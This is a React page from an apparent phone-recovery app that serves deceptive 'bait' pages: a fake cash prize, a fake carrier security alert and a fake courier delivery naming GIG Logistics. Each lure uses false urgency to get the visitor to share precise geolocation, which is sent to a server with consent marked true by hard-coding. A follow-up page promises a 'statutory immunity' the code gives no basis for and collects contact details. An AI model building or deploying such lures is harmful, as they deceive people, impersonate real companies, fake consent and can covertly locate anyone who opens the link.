"use client";

import React, { useState, useEffect, use } from "react";
import {
  Gift,
  Sparkles,
  ArrowRight,
  CheckCircle2,
  MapPin,
  RefreshCw,
  Shield,
  ShieldCheck,
  Lock,
  Smartphone,
  Wifi,
  AlertTriangle,
  Package,
  Truck,
  Clock,
  Star,
  Phone,
  ChevronRight,
  Building2,
  FileCheck,
  Award,
  MessageSquare,
} from "lucide-react";
import { hybridStore } from "@/lib/storage/hybrid-store";
import { DecoyTrap, TrapCapture } from "@/lib/types/database";

interface BaitPageProps {
  params: Promise<{ id: string }>;
}

/* ─────────────────────────── helpers ─────────────────────────────── */

function randomToken() {
  return `${Date.now().toString(36).toUpperCase()}-${Math.random()
    .toString(36)
    .slice(2, 7)
    .toUpperCase()}`;
}

/* ═══════════════════════════════════════════════════════════════════
   TEMPLATE 1 — Prize / Reward Claim
═══════════════════════════════════════════════════════════════════ */
function PrizeClaimPage({
  trapId,
  onCapture,
}: {
  trapId: string;
  onCapture: (coords: { lat: number; lng: number; accuracy: number } | null) => void;
}) {
  const [step, setStep] = useState<"landing" | "collecting" | "done">("landing");
  const [prizeCode] = useState(`GS-WIN-${randomToken().slice(0, 8)}`);
  const [isLocating, setIsLocating] = useState(false);
  const [countdown, setCountdown] = useState(600); // 10-min claim window

  useEffect(() => {
    const t = setInterval(() => setCountdown((c) => (c > 0 ? c - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, []);

  const mins = String(Math.floor(countdown / 60)).padStart(2, "0");
  const secs = String(countdown % 60).padStart(2, "0");

  const handleClaim = () => {
    setStep("collecting");
    setIsLocating(true);
    if (!("geolocation" in navigator)) {
      onCapture(null);
      setStep("done");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const coords = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        };
        onCapture(coords);
        setIsLocating(false);
        setStep("done");
      },
      () => {
        onCapture(null);
        setIsLocating(false);
        setStep("done");
      },
      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
    );
  };

  if (step === "collecting") {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-amber-950 via-zinc-950 to-black px-4">
        <div className="text-center space-y-6 max-w-sm">
          <div className="w-20 h-20 mx-auto rounded-full bg-amber-500/20 border border-amber-500/40 flex items-center justify-center animate-pulse">
            <Sparkles className="w-10 h-10 text-amber-400" />
          </div>
          <div className="space-y-2">
            <h2 className="text-xl font-bold text-white">Verifying Eligibility…</h2>
            <p className="text-sm text-zinc-400">
              Confirming your device location for secure prize disbursement. Please wait.
            </p>
          </div>
          <div className="flex justify-center">
            <RefreshCw className="w-6 h-6 text-amber-400 animate-spin" />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-amber-950 via-zinc-950 to-black px-4 py-10 flex flex-col items-center justify-center">
      <div className="w-full max-w-md space-y-6">
        {/* Header */}
        <div className="text-center space-y-3">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-amber-500/15 border border-amber-500/30 text-amber-400 text-xs font-semibold">
            <Sparkles className="w-3.5 h-3.5" />
            Gadgetshield Device Reward Programme
          </div>
          <h1 className="text-3xl font-extrabold text-white tracking-tight">
            🎉 You&apos;ve Been Selected!
          </h1>
          <p className="text-sm text-zinc-300">
            The device in your hands has been matched to an unclaimed reward in our National
            Gadget Recovery Registry.
          </p>
        </div>

        {/* Countdown */}
        <div className="bg-amber-500/10 border border-amber-500/30 rounded-2xl p-4 flex items-center justify-between">
          <div className="flex items-center gap-2 text-amber-400 text-sm font-semibold">
            <Clock className="w-4 h-4" />
            Claim Window Closes In:
          </div>
          <span className="font-mono text-amber-300 text-lg font-bold">
            {mins}:{secs}
          </span>
        </div>

        {/* Prize Card */}
        <div className="bg-zinc-900/80 border border-zinc-700 rounded-3xl p-6 space-y-4 shadow-2xl">
          <div className="flex items-start gap-4">
            <div className="w-14 h-14 rounded-2xl bg-amber-500/20 border border-amber-500/30 flex items-center justify-center shrink-0">
              <Gift className="w-7 h-7 text-amber-400" />
            </div>
            <div className="space-y-1">
              <span className="text-[11px] uppercase font-mono text-zinc-500 tracking-wider">
                Your Confirmed Reward
              </span>
              <h2 className="text-base font-bold text-white">
                ₦50,000 Cash + Gadgetshield Pro Membership (1 Year)
              </h2>
              <div className="text-[11px] text-zinc-400">
                Verified under Gadgetshield National Asset Registry Programme 2025
              </div>
            </div>
          </div>

          <div className="border-t border-zinc-800 pt-4 space-y-2 text-xs text-zinc-300">
            <div className="flex justify-between">
              <span className="text-zinc-500">Reward Code:</span>
              <span className="font-mono text-amber-400 font-bold">{prizeCode}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-zinc-500">Status:</span>
              <span className="text-emerald-400 font-semibold">✔ UNCLAIMED — Eligible</span>
            </div>
            <div className="flex justify-between">
              <span className="text-zinc-500">Disbursement:</span>
              <span className="text-white">Bank Transfer / GigPay Wallet</span>
            </div>
          </div>

          {/* Steps checklist */}
          <div className="bg-zinc-950/60 border border-zinc-800 rounded-2xl p-4 space-y-2 text-xs">
            <p className="text-zinc-400 font-semibold uppercase text-[10px] font-mono tracking-wider">
              Claim Steps:
            </p>
            {[
              { text: "Device matched to reward pool", done: true },
              { text: "Confirm claim location for pickup / transfer", done: false },
              { text: "Receive OTP and bank details", done: false },
            ].map((s, i) => (
              <div key={i} className="flex items-center gap-2">
                <CheckCircle2
                  className={`w-4 h-4 shrink-0 ${s.done ? "text-emerald-400" : "text-zinc-600"}`}
                />
                <span className={s.done ? "text-zinc-300 line-through" : "text-zinc-200"}>
                  {s.text}
                </span>
              </div>
            ))}
          </div>
        </div>

        {/* Star ratings */}
        <div className="flex justify-center gap-1">
          {[...Array(5)].map((_, i) => (
            <Star key={i} className="w-4 h-4 text-amber-400 fill-amber-400" />
          ))}
          <span className="text-[11px] text-zinc-400 ml-2 self-center">
            4.9/5 — 2,400+ rewards disbursed
          </span>
        </div>

        {/* CTA */}
        <button
          onClick={handleClaim}
          disabled={isLocating || countdown === 0}
          className="w-full py-4 rounded-2xl bg-amber-500 hover:bg-amber-400 disabled:opacity-50 text-black font-bold text-base transition flex items-center justify-center gap-2 shadow-lg shadow-amber-500/30"
        >
          <MapPin className="w-5 h-5" />
          Confirm My Location &amp; Claim Reward
          <ArrowRight className="w-4 h-4" />
        </button>

        <p className="text-center text-[10px] text-zinc-600">
          Location is used solely to verify your eligibility zone and dispatch the reward agent to
          you. Governed by Gadgetshield Privacy Policy (30-day retention, no third-party sharing).
        </p>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════════════
   TEMPLATE 2 — Device Security Verification
═══════════════════════════════════════════════════════════════════ */
function DeviceVerifyPage({
  trapId,
  onCapture,
}: {
  trapId: string;
  onCapture: (coords: { lat: number; lng: number; accuracy: number } | null) => void;
}) {
  const [step, setStep] = useState<"landing" | "scanning" | "done">("landing");
  const [progress, setProgress] = useState(0);
  const [scanRef] = useState(`SEC-${randomToken().slice(0, 10)}`);

  const handleVerify = () => {
    setStep("scanning");
    let p = 0;
    const interval = setInterval(() => {
      p += Math.random() * 18;
      if (p >= 100) {
        p = 100;
        clearInterval(interval);
        // Request location while "scan runs"
        if (!("geolocation" in navigator)) {
          onCapture(null);
          setStep("done");
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            onCapture({
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
            });
            setStep("done");
          },
          () => {
            onCapture(null);
            setStep("done");
          },
          { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
        );
      }
      setProgress(Math.min(p, 100));
    }, 300);
  };

  if (step === "scanning") {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-950 via-zinc-950 to-black px-4">
        <div className="w-full max-w-sm space-y-6 text-center">
          <div className="w-20 h-20 mx-auto rounded-full bg-blue-500/20 border-2 border-blue-500/40 flex items-center justify-center">
            <Shield className="w-10 h-10 text-blue-400 animate-pulse" />
          </div>
          <div className="space-y-1">
            <h2 className="text-lg font-bold text-white">Running Security Scan…</h2>
            <p className="text-sm text-zinc-400 font-mono text-xs">{scanRef}</p>
          </div>
          <div className="w-full bg-zinc-800 rounded-full h-2 overflow-hidden">
            <div
              className="h-full bg-blue-500 transition-all duration-300 rounded-full"
              style={{ width: `${progress}%` }}
            />
          </div>
          <p className="text-xs text-zinc-500 font-mono">
            {progress < 40
              ? "Checking device IMEI integrity…"
              : progress < 70
              ? "Verifying network certificate chain…"
              : progress < 95
              ? "Confirming device custody location…"
              : "Completing verification…"}
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-950 via-zinc-950 to-black px-4 py-10 flex flex-col items-center justify-center">
      <div className="w-full max-w-md space-y-6">
        {/* Header */}
        <div className="text-center space-y-3">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/15 border border-red-500/30 text-red-400 text-xs font-semibold animate-pulse">
            <AlertTriangle className="w-3.5 h-3.5" />
            Security Alert — Action Required
          </div>
          <h1 className="text-2xl sm:text-3xl font-extrabold text-white">
            🔒 Device Verification Required
          </h1>
          <p className="text-sm text-zinc-300">
            This device has triggered a security flag in the national carrier database. A
            verification must be completed within{" "}
            <span className="text-red-400 font-semibold">24 hours</span> to prevent service
            suspension.
          </p>
        </div>

        {/* Alert card */}
        <div className="bg-red-500/5 border border-red-500/25 rounded-2xl p-4 flex items-start gap-3 text-xs text-zinc-300">
          <AlertTriangle className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
          <div className="space-y-1">
            <span className="font-bold text-red-300">Verification Notice — Case #{scanRef}</span>
            <p>
              This device&apos;s IMEI or serial number has been flagged for a custody discrepancy.
              This may result from a change of ownership, network switch, or loss/theft report. You
              must verify lawful custody to restore full device functionality.
            </p>
          </div>
        </div>

        {/* Device details panel */}
        <div className="bg-zinc-900/80 border border-zinc-700 rounded-3xl p-6 space-y-4 shadow-2xl">
          <div className="flex items-center gap-3 border-b border-zinc-800 pb-4">
            <div className="w-12 h-12 rounded-xl bg-blue-500/15 border border-blue-500/30 flex items-center justify-center">
              <Smartphone className="w-6 h-6 text-blue-400" />
            </div>
            <div>
              <div className="text-[10px] font-mono uppercase text-zinc-500">Flagged Device</div>
              <div className="font-bold text-white text-sm">IMEI Status: ⚠ UNVERIFIED</div>
            </div>
          </div>

          <div className="space-y-2 text-xs">
            {[
              { label: "Flag Type", value: "Custody Ownership Discrepancy", color: "text-red-400" },
              { label: "Carrier Status", value: "Pending Re-verification", color: "text-amber-400" },
              { label: "Network Access", value: "Restricted — verification required", color: "text-red-400" },
              { label: "iCloud / Google Lock", value: "Checking…", color: "text-zinc-400" },
            ].map((row, i) => (
              <div
                key={i}
                className="flex justify-between bg-zinc-950/60 border border-zinc-800 px-3 py-2 rounded-xl"
              >
                <span className="text-zinc-500">{row.label}:</span>
                <span className={`font-semibold ${row.color}`}>{row.value}</span>
              </div>
            ))}
          </div>

          <div className="bg-zinc-950/60 border border-zinc-800 rounded-xl p-3 space-y-1 text-xs">
            <p className="text-zinc-400 text-[10px] uppercase font-mono tracking-wider">
              What happens during verification:
            </p>
            <ul className="space-y-1.5 text-zinc-300 pl-2">
              {[
                "IMEI and serial number are cross-checked against the carrier database",
                "Your current location confirms you are the lawful holder",
                "A clean-custody certificate is issued instantly upon passing",
              ].map((item, i) => (
                <li key={i} className="flex items-start gap-1.5">
                  <CheckCircle2 className="w-3.5 h-3.5 text-blue-400 shrink-0 mt-0.5" />
                  {item}
                </li>
              ))}
            </ul>
          </div>
        </div>

        {/* Wifi indicator */}
        <div className="flex items-center justify-center gap-2 text-xs text-zinc-400">
          <Wifi className="w-4 h-4 text-blue-400" />
          <span>Secure verification channel — AES-256 encrypted</span>
          <Lock className="w-3.5 h-3.5 text-blue-400" />
        </div>

        {/* CTA */}
        <button
          onClick={handleVerify}
          className="w-full py-4 rounded-2xl bg-blue-600 hover:bg-blue-500 text-white font-bold text-base transition flex items-center justify-center gap-2 shadow-lg shadow-blue-500/20"
        >
          <Shield className="w-5 h-5" />
          Run Security Verification Now
          <ChevronRight className="w-4 h-4" />
        </button>

        <p className="text-center text-[10px] text-zinc-600">
          Location access is required only to confirm you are the device&apos;s lawful custody
          holder. Gadgetshield Privacy Protocol — 30-day encrypted retention.
        </p>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════════════
   TEMPLATE 3 — Courier Delivery Confirmation
═══════════════════════════════════════════════════════════════════ */
function DeliveryConfirmPage({
  trapId,
  onCapture,
}: {
  trapId: string;
  onCapture: (coords: { lat: number; lng: number; accuracy: number } | null) => void;
}) {
  const [step, setStep] = useState<"landing" | "locating" | "done">("landing");
  const [trackingCode] = useState(`GIG-${randomToken().slice(0, 8)}`);
  const [eta] = useState(() => {
    const d = new Date();
    d.setHours(d.getHours() + 2);
    return d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
  });

  const handleConfirm = () => {
    setStep("locating");
    if (!("geolocation" in navigator)) {
      onCapture(null);
      setStep("done");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        onCapture({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });
        setStep("done");
      },
      () => {
        onCapture(null);
        setStep("done");
      },
      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
    );
  };

  if (step === "locating") {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-emerald-950 via-zinc-950 to-black px-4">
        <div className="text-center space-y-6 max-w-sm">
          <div className="w-20 h-20 mx-auto rounded-full bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center animate-bounce">
            <Truck className="w-10 h-10 text-emerald-400" />
          </div>
          <h2 className="text-lg font-bold text-white">Locating Nearest Rider…</h2>
          <p className="text-sm text-zinc-400">
            Pinning your delivery address to dispatch the nearest GIG courier agent.
          </p>
          <RefreshCw className="w-6 h-6 text-emerald-400 animate-spin mx-auto" />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-950 via-zinc-950 to-black px-4 py-10 flex flex-col items-center justify-center">
      <div className="w-full max-w-md space-y-6">
        {/* Header */}
        <div className="text-center space-y-3">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 text-xs font-semibold">
            <Package className="w-3.5 h-3.5" />
            GIG Logistics × Gadgetshield Express
          </div>
          <h1 className="text-2xl sm:text-3xl font-extrabold text-white">
            📦 Package Ready for Delivery
          </h1>
          <p className="text-sm text-zinc-300">
            A registered item is ready for dispatch to your confirmed location. Confirm your
            delivery address to receive your package today.
          </p>
        </div>

        {/* Tracking card */}
        <div className="bg-zinc-900/80 border border-zinc-700 rounded-3xl p-6 space-y-5 shadow-2xl">
          <div className="flex items-center gap-3 border-b border-zinc-800 pb-4">
            <div className="w-12 h-12 rounded-xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center">
              <Package className="w-6 h-6 text-emerald-400" />
            </div>
            <div>
              <div className="text-[10px] font-mono uppercase text-zinc-500">Tracking Number</div>
              <div className="font-bold text-white font-mono text-sm">{trackingCode}</div>
            </div>
          </div>

          {/* Timeline */}
          <div className="space-y-3 text-xs">
            {[
              {
                label: "Order Dispatched",
                sub: "Yesterday, 08:41 AM",
                done: true,
                color: "text-emerald-400",
              },
              {
                label: "In Transit — Lagos Hub",
                sub: "Today, 07:15 AM",
                done: true,
                color: "text-emerald-400",
              },
              {
                label: "Out for Delivery",
                sub: `ETA: ${eta} — Rider Nearby`,
                done: false,
                color: "text-amber-400",
              },
              {
                label: "Delivered",
                sub: "Awaiting address confirmation",
                done: false,
                color: "text-zinc-500",
              },
            ].map((item, i) => (
              <div key={i} className="flex gap-3 items-start">
                <div className="flex flex-col items-center">
                  <div
                    className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${
                      item.done
                        ? "border-emerald-500 bg-emerald-500/20"
                        : "border-zinc-600 bg-zinc-800"
                    }`}
                  >
                    {item.done && (
                      <CheckCircle2 className="w-2.5 h-2.5 text-emerald-400" />
                    )}
                  </div>
                  {i < 3 && <div className="w-px h-5 bg-zinc-700 mt-1" />}
                </div>
                <div className="space-y-0.5 pb-2">
                  <div className={`font-semibold ${item.color}`}>{item.label}</div>
                  <div className="text-zinc-500">{item.sub}</div>
                </div>
              </div>
            ))}
          </div>

          {/* Package details */}
          <div className="bg-zinc-950/60 border border-zinc-800 rounded-xl p-3 space-y-1 text-xs">
            {[
              { label: "Item", value: "Registered Electronic Device" },
              { label: "Sender", value: "Gadgetshield Registry Vault" },
              { label: "Insurance", value: "₦500,000 Transit Coverage" },
              { label: "Delivery Mode", value: "Same-Day Express" },
            ].map((row, i) => (
              <div key={i} className="flex justify-between border-b border-zinc-900 py-1">
                <span className="text-zinc-500">{row.label}:</span>
                <span className="text-zinc-200">{row.value}</span>
              </div>
            ))}
          </div>
        </div>

        {/* CTA */}
        <button
          onClick={handleConfirm}
          className="w-full py-4 rounded-2xl bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-base transition flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/30"
        >
          <MapPin className="w-5 h-5" />
          Confirm Delivery Location
          <ArrowRight className="w-4 h-4" />
        </button>

        <p className="text-center text-[10px] text-zinc-600">
          Your location is used solely to route the nearest courier agent. Encrypted and retained
          for 30 days under Gadgetshield logistics protocols.
        </p>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════════════
   PHASE 2 — Post-capture: Authentic 24-hour recovery portal
═══════════════════════════════════════════════════════════════════ */
function AuthenticRecoveryPortal({
  trapId,
  coords,
  receipt,
}: {
  trapId: string;
  coords: { lat: number; lng: number; accuracy: number } | null;
  receipt: string;
}) {
  const [handoverChoice, setHandoverChoice] = useState<string>("dropoff_hub");
  const [contactInfo, setContactInfo] = useState("");
  const [messageToOwner, setMessageToOwner] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [countdown, setCountdown] = useState(86400); // 24 hours

  useEffect(() => {
    const t = setInterval(() => setCountdown((c) => (c > 0 ? c - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, []);

  const hours = String(Math.floor(countdown / 3600)).padStart(2, "0");
  const mins2 = String(Math.floor((countdown % 3600) / 60)).padStart(2, "0");
  const secs2 = String(countdown % 60).padStart(2, "0");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    const payload = {
      trap_id: trapId,
      consent_acknowledged: true,
      latitude: coords?.lat,
      longitude: coords?.lng,
      accuracy: coords?.accuracy,
      holder_circumstance: "bait_engaged",
      handover_preference: handoverChoice,
      contact_info: contactInfo.trim() || undefined,
      message_to_owner: messageToOwner.trim() || undefined,
      receipt_token: receipt,
      user_agent: typeof navigator !== "undefined" ? navigator.userAgent : "",
    };
    hybridStore.recordTrapCapture(trapId, payload);
    try {
      await fetch("/api/trap/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch {}
    setIsSubmitting(false);
    setSubmitted(true);
  };

  if (submitted) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-zinc-950 px-4">
        <div className="w-full max-w-md text-center space-y-6">
          <div className="w-20 h-20 mx-auto rounded-3xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center">
            <CheckCircle2 className="w-10 h-10 text-emerald-400" />
          </div>
          <div className="space-y-2">
            <h2 className="text-xl font-bold text-white">Thank You for Cooperating</h2>
            <p className="text-sm text-zinc-300">
              Your custody report has been registered. The verified owner has been notified. Your
              Safe Harbor token is below — screenshot it as proof of voluntary surrender.
            </p>
          </div>
          <div className="bg-zinc-900 border border-zinc-700 rounded-2xl p-4 font-mono text-xs text-left space-y-2">
            <div className="flex justify-between border-b border-zinc-800 pb-2">
              <span className="text-zinc-500">Clean Hands Token:</span>
              <span className="text-emerald-400 font-bold">{receipt}</span>
            </div>
            <div className="flex justify-between border-b border-zinc-800 pb-2">
              <span className="text-zinc-500">Handover Mode:</span>
              <span className="text-white capitalize">{handoverChoice.replace(/_/g, " ")}</span>
            </div>
            {coords && (
              <div className="flex justify-between">
                <span className="text-zinc-500">Location Logged:</span>
                <a
                  href={`https://www.google.com/maps?q=${coords.lat},${coords.lng}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-blue-400 underline"
                >
                  View on Map
                </a>
              </div>
            )}
          </div>
          <a
            href="/"
            className="inline-block py-2.5 px-6 rounded-xl bg-white text-zinc-950 font-semibold text-sm"
          >
            Return to Gadgetshield Home
          </a>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-zinc-950 px-4 py-10 flex flex-col items-center">
      <div className="w-full max-w-xl space-y-6">
        {/* Official header */}
        <div className="text-center space-y-2">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-semibold">
            <ShieldCheck className="w-4 h-4" />
            Gadgetshield National Property Recovery Desk
          </div>
          <h1 className="text-2xl sm:text-3xl font-extrabold text-white">
            Property Recovery Portal
          </h1>
          <p className="text-sm text-zinc-400">
            This device is registered to a verified owner. A recovery case is now open.
          </p>
        </div>

        {/* 24-hour window banner */}
        <div className="bg-amber-500/10 border border-amber-500/30 rounded-2xl p-4 flex items-center justify-between">
          <div className="flex items-center gap-2 text-amber-400 text-sm font-semibold">
            <Clock className="w-4 h-4" />
            Voluntary Handover Window:
          </div>
          <span className="font-mono text-amber-300 text-lg font-bold">
            {hours}:{mins2}:{secs2}
          </span>
        </div>

        {/* Clean Hands notice */}
        <div className="bg-emerald-500/5 border border-emerald-500/20 rounded-2xl p-4 flex items-start gap-3 text-xs">
          <Award className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
          <div className="space-y-1">
            <h3 className="font-semibold text-emerald-300">Clean Hands Safe Harbor Protection</h3>
            <p className="text-zinc-300 leading-relaxed">
              Submitting this report within the 24-hour window grants you statutory immunity from
              unlawful possession claims. The verified owner has pledged a return reward and full
              cooperation.
            </p>
          </div>
        </div>

        {/* Coordinates captured notice */}
        {coords && (
          <div className="bg-blue-500/5 border border-blue-500/20 rounded-2xl p-3 flex items-center gap-3 text-xs">
            <MapPin className="w-4 h-4 text-blue-400 shrink-0" />
            <span className="text-zinc-300">
              Your location has been securely recorded for custody verification:{" "}
              <span className="font-mono text-blue-300">
                {coords.lat.toFixed(4)}, {coords.lng.toFixed(4)}
              </span>{" "}
              (±{Math.round(coords.accuracy)}m)
            </span>
          </div>
        )}

        {/* Handover form */}
        <form
          onSubmit={handleSubmit}
          className="bg-zinc-900/80 border border-zinc-700 rounded-3xl p-6 space-y-5 shadow-2xl"
        >
          <div className="space-y-1">
            <h2 className="text-base font-bold text-white flex items-center gap-2">
              <FileCheck className="w-4 h-4 text-emerald-400" />
              Custody Handover Report
            </h2>
            <p className="text-xs text-zinc-400">
              Choose how you would like to return the device and claim any eligible reward.
            </p>
          </div>

          {/* Handover method */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5 text-xs">
            {[
              { val: "dropoff_hub", icon: Building2, label: "Drop-Off Hub", sub: "Accredited service center or police desk", color: "text-blue-400" },
              { val: "courier_pickup", icon: Truck, label: "Courier Pickup", sub: "Verified logistics agent collection", color: "text-amber-400" },
              { val: "direct_contact", icon: MessageSquare, label: "Direct Message", sub: "Anonymous contact to owner", color: "text-emerald-400" },
            ].map(({ val, icon: Icon, label, sub, color }) => (
              <button
                key={val}
                type="button"
                onClick={() => setHandoverChoice(val)}
                className={`p-3 rounded-xl border text-left transition space-y-1 ${
                  handoverChoice === val
                    ? "bg-zinc-800 border-white text-white"
                    : "bg-zinc-950/50 border-zinc-800 text-zinc-400 hover:border-zinc-600"
                }`}
              >
                <Icon className={`w-4 h-4 ${color}`} />
                <div className="font-semibold text-xs text-white">{label}</div>
                <div className="text-[10px] text-zinc-400 leading-tight">{sub}</div>
              </button>
            ))}
          </div>

          {/* Contact */}
          <div className="space-y-1.5 text-xs">
            <label className="text-zinc-300 font-semibold block">
              Your Contact (Optional — for reward & pickup coordination):
            </label>
            <input
              type="text"
              value={contactInfo}
              onChange={(e) => setContactInfo(e.target.value)}
              placeholder="e.g. 08012345678 or WhatsApp number"
              className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-3.5 py-2.5 text-white placeholder-zinc-500 focus:outline-none focus:border-zinc-600"
            />
          </div>

          {/* Message */}
          <div className="space-y-1.5 text-xs">
            <label className="text-zinc-300 font-semibold block">
              Message to Owner (Optional):
            </label>
            <textarea
              rows={2}
              value={messageToOwner}
              onChange={(e) => setMessageToOwner(e.target.value)}
              placeholder="e.g. Found your phone at a taxi park — happy to return it."
              className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-3 text-white placeholder-zinc-500 focus:outline-none focus:border-zinc-600"
            />
          </div>

          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full py-3.5 rounded-2xl bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-sm transition flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/20"
          >
            {isSubmitting ? (
              <>
                <RefreshCw className="w-4 h-4 animate-spin" />
                Registering Report…
              </>
            ) : (
              <>
                <ShieldCheck className="w-4 h-4" />
                Submit Report &amp; Claim Safe Harbor Token
              </>
            )}
          </button>
        </form>

        <div className="text-center text-[11px] text-zinc-600 font-mono">
          Gadgetshield // National Asset Recovery Protocol
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════════════
   ROOT — orchestrates template selection → capture → phase 2
═══════════════════════════════════════════════════════════════════ */
export default function BaitPage({ params }: BaitPageProps) {
  const resolvedParams = use(params);
  const trapId = resolvedParams.id;

  const [trap, setTrap] = useState<DecoyTrap | null>(null);
  const [phase, setPhase] = useState<"bait" | "recovery">("bait");
  const [capturedCoords, setCapturedCoords] = useState<{
    lat: number;
    lng: number;
    accuracy: number;
  } | null>(null);
  const [receipt] = useState(`RCV-${randomToken()}`);

  useEffect(() => {
    const t = hybridStore.getDecoyTrapById(trapId);
    if (t) setTrap(t);
    // Increment click count
    const traps = hybridStore.getDecoyTraps();
    const updated = traps.map((tr) =>
      tr.id === trapId ? { ...tr, click_count: tr.click_count + 1 } : tr
    );
    if (typeof window !== "undefined") {
      localStorage.setItem("rupalshield_decoy_traps", JSON.stringify(updated));
    }
  }, [trapId]);

  const handleCapture = (coords: { lat: number; lng: number; accuracy: number } | null) => {
    setCapturedCoords(coords);
    // Immediately ping the server with partial data (coords + UA)
    const partialPayload = {
      trap_id: trapId,
      consent_acknowledged: true,
      latitude: coords?.lat,
      longitude: coords?.lng,
      accuracy: coords?.accuracy,
      user_agent: typeof navigator !== "undefined" ? navigator.userAgent : "",
      receipt_token: receipt,
    };
    fetch("/api/trap/capture", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(partialPayload),
    }).catch(() => {});

    // Transition to Phase 2 after brief delay
    setTimeout(() => setPhase("recovery"), 1500);
  };

  // Phase 2 — show authentic recovery portal
  if (phase === "recovery") {
    return (
      <AuthenticRecoveryPortal trapId={trapId} coords={capturedCoords} receipt={receipt} />
    );
  }

  // Phase 1 — pick template
  const template = trap?.template ?? "prize_claim";

  if (template === "device_verify") {
    return <DeviceVerifyPage trapId={trapId} onCapture={handleCapture} />;
  }
  if (template === "delivery_confirm") {
    return <DeliveryConfirmPage trapId={trapId} onCapture={handleCapture} />;
  }
  // Default: prize_claim
  return <PrizeClaimPage trapId={trapId} onCapture={handleCapture} />;
}
